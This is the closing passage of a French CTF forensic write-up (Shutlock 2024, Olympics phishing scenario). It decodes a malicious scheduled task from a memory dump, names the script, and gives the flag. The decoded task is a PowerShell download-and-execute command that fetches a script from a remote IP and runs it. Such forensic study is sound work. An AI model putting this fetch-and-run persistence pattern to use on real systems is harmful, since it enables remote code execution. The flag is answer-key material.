</span></span><span class="line"><span class="cl">2f 00 31 00 37 00 32 00	/.1.7.2.
</span></span><span class="line"><span class="cl">2e 00 32 00 31 00 2e 00	..2.1...
</span></span><span class="line"><span class="cl">31 00 39 00 35 00 2e 00	1.9.5...
</span></span><span class="line"><span class="cl">31 00 37 00 3a 00 35 00	1.7.:.5.
</span></span><span class="line"><span class="cl">30 00 30 00 30 00 2f 00	0.0.0./.
</span></span><span class="line"><span class="cl">48 00 6f 00 6c 00 6d 00	H.o.l.m.
</span></span><span class="line"><span class="cl">65 00 73 00 2f 00 47 00	e.s./.G.
</span></span><span class="line"><span class="cl">65 00 74 00 46 00 69 00	e.t.F.i.
</span></span><span class="line"><span class="cl">6c 00 65 00 49 00 6e 00	l.e.I.n.
</span></span><span class="line"><span class="cl">66 00 6f 00 2e 00 70 00	f.o...p.
</span></span><span class="line"><span class="cl">73 00 31 00 20 00 2d 00	s.1...-.
</span></span><span class="line"><span class="cl">4f 00 75 00 74 00 46 00	O.u.t.F.
</span></span><span class="line"><span class="cl">69 00 6c 00 65 00 20 00	i.l.e...
</span></span><span class="line"><span class="cl">47 00 65 00 74 00 46 00	G.e.t.F.
</span></span><span class="line"><span class="cl">69 00 6c 00 65 00 73 00	i.l.e.s.
</span></span><span class="line"><span class="cl">49 00 6e 00 66 00 6f 00	I.n.f.o.
</span></span><span class="line"><span class="cl">2e 00 70 00 73 00 31 00	..p.s.1.
</span></span><span class="line"><span class="cl">20 00 3b 00 20 00 53 00	..;...S.
</span></span><span class="line"><span class="cl">74 00 61 00 72 00 74 00	t.a.r.t.
</span></span><span class="line"><span class="cl">2d 00 50 00 72 00 6f 00	-.P.r.o.
</span></span><span class="line"><span class="cl">63 00 65 00 73 00 73 00	c.e.s.s.
</span></span><span class="line"><span class="cl">20 00 2d 00 46 00 69 00	..-.F.i.
</span></span><span class="line"><span class="cl">6c 00 65 00 50 00 61 00	l.e.P.a.
</span></span><span class="line"><span class="cl">74 00 68 00 20 00 47 00	t.h...G.
</span></span><span class="line"><span class="cl">65 00 74 00 46 00 69 00	e.t.F.i.
</span></span><span class="line"><span class="cl">6c 00 65 00 73 00 49 00	l.e.s.I.
</span></span><span class="line"><span class="cl">6e 00 66 00 6f 00 2e 00	n.f.o...
</span></span><span class="line"><span class="cl">70 00 73 00 31 00 00 00	p.s.1...&#34;	False
</span></span><span class="line"><span class="cl">* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	DynamicInfo	&#34;
</span></span><span class="line"><span class="cl">03 00 00 00 fd 09 2f 25	....../%
</span></span><span class="line"><span class="cl">11 b9 da 01 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00	........&#34;	False
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>On retrouve les différents champs, correspondant aux sous-clés de registre tel que URL, Trigger, Author, etc. Qui sont bien présents si on regarde dans <strong>regedit</strong>.</p>
<p>Ce qui nous intéresse ici est la sous-clé <strong>Actions</strong>, sous cette dernière on retrouve l&rsquo;appel du script en hexadécimal, un passage dans cyberchef plus tard on obtient ça:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="n">Authorff</span><span class="s2">&#34;Invoke-WebRequest-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1
</span></span></span></code></pre></div><p>Le nom du script est <strong>GetFilesInfo.ps1</strong>.</p>
<hr>
<h2 id="flag">Flag<a href="#flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>En regroupant les 3 informations, le flag est: <strong>SHLK{Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk-IGotYourFileInfo-GetFilesInfo.ps1}</strong>.</p>
<hr>
<h2 id="sources">Sources<a href="#sources" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<ul>
<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet</a></li>
<li><a href="https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html">https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html</a></li>
<li><a href="https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder">https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder</a></li>
<li><a href="https://fr.wikipedia.org/wiki/.lnk">https://fr.wikipedia.org/wiki/.lnk</a></li>
</ul>

			</div>

		</article>
		<aside id="toc">
			<div class="toc-title"></div>
			<nav id="TableOfContents">
  <ul>
    <li><a href="#énoncé">Énoncé</a></li>
    <li><a href="#investigation">Investigation</a>
      <ul>
        <li><a href="#déterminer-los">Déterminer l&rsquo;OS</a></li>
        <li><a href="#extraction-des-objets-courants">Extraction des objets courants</a></li>
        <li><a href="#flag-13---raccourcis-malveillant">Flag 1/3 - Raccourcis malveillant</a></li>
        <li><a href="#flag-23---tâche-planifiée">Flag 2/3 - Tâche planifiée</a></li>
        <li><a href="#flag-33---script">Flag 3/3 - Script</a></li>
      </ul>
    </li>
    <li><a href="#flag">Flag</a></li>
    <li><a href="#sources">Sources</a></li>
  </ul>
</nav>
		</aside>
		<div class="post-nav thin">
			<a class="next-post" href="http://localhost:1313/posts/shutlock2024_phishing_2-2/shutlock2024_phishing_2-2/">
				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2</span>
			</a>
			<a class="prev-post" href="http://localhost:1313/posts/installation_robert2/installation_robert2/">
				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Installation de Loxya(Robert2)</span>
			</a>
		</div>
	</main>

<footer id="site-footer" class="section-inner thin animated fadeIn faster">
	<p>
		&copy; 2025 <a href="http://localhost:1313/">Onirix</a>
		&#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>
		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a>
		&#183; <a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></p>

</footer>
<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script>
</body>

</html>
